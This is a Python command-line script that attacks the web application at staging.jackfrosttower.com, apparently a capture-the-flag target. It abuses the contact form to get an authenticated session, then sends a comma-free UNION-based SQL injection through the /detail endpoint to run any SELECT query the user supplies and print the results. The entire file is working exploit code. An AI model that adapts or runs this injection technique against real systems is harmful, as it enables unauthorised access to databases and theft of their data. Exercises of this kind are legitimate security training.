#!/usr/bin/env python
import click
import requests
from bs4 import BeautifulSoup


def authenticate(sess: requests.Session) -> bool:
    """Submit the same contact form data twice to authenticate."""
    authenticated = False

    for _ in range(2):
        # Get the CSRF token
        url = 'https://staging.jackfrosttower.com/contact'
        resp = sess.get(url)
        soup = BeautifulSoup(resp.text, features="html.parser")
        csrf_token = soup.find('input', {'name': '_csrf'})['value']

        # Submit the form
        url = 'https://staging.jackfrosttower.com/postcontact'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = {
            '_csrf': csrf_token,
            'fullname': 'name',
            'email': 'me@email.com',
            'phone': '1234567890',
            'country': 'Belgium',
            'submit': 'SAVE',
        }
        resp = sess.post(url, headers=headers, data=data)

    soup = BeautifulSoup(resp.text, features="html.parser")

    if "Email Already Exists" in soup.find('p', {'class': 'success'}):
        authenticated = True
        print("[+] Authentication successful")

    return authenticated


@click.command()
@click.option('-q', '--query', required=True, help='SQL select statement to run.')
def cli(query: str):
    url = "https://staging.jackfrosttower.com/detail"
    sess = requests.Session()
    sqli = (
        "0,0 union select * from ((select 1)F1 join ({})F2 join "
        "(select 3)F3 join (select 4)F4 join (select 5)F5 join "
        "(select 6)F6 join (select 7)F7);--"
    )

    if authenticate(sess):
        # Perform an SQL injection attack against the /detail endpoint
        resp = sess.get(f"{url}/{sqli.format(query)}")

        if resp.status_code == 200:
            if "<h1>" in resp.text:
                print("[+] Results:")
                soup = BeautifulSoup(resp.text, features="html.parser")
                results = soup.find_all("h1")

                for idx, result in enumerate(results):
                    print(f"{idx + 1}. {result.text.strip()}")
            else:
                print("[+] No results found.")
        else:
            print("[-] Something went wrong :/")
    else:
        print("[-] Authentication failure")


if __name__ == '__main__':
    cli()
